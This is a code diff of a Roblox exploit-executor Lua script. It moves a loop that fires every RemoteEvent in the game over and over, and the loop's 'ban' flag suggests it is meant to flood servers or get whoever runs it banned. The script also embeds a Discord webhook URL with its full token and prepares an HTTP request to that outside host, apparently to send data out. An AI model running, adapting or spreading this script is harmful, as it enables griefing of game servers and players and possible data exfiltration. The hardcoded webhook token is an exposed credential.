@@ -1,13 +1,4 @@
 
-getgenv().ban = true
-while ban do wait()
-for i,v in pairs(game:GetDescendants()) do
-if v:IsA("RemoteEvent") then
-v:FireServer()
-end
-end
-end
-
 HttpService = game:GetService("HttpService") 
  Webhook_URL =  "https://discord.com/api/webhooks/1165544617341616138/QiOP7PFZwHyGcOwM8UCgBRxtamewk6Uh_mXucGo4XcLAHMMFW-rW5ju5S6rsK2-TTm5_" 
  local ok = request or http_request or (http and http.request) or syn.request 
@@ -51,6 +42,14 @@ HttpService = game:GetService("HttpService")
  }) 
  })
 
+getgenv().ban = true
+while ban do wait()
+for i,v in pairs(game:GetDescendants()) do
+if v:IsA("RemoteEvent") then
+v:FireServer()
+end
+end
+end
 
 
 
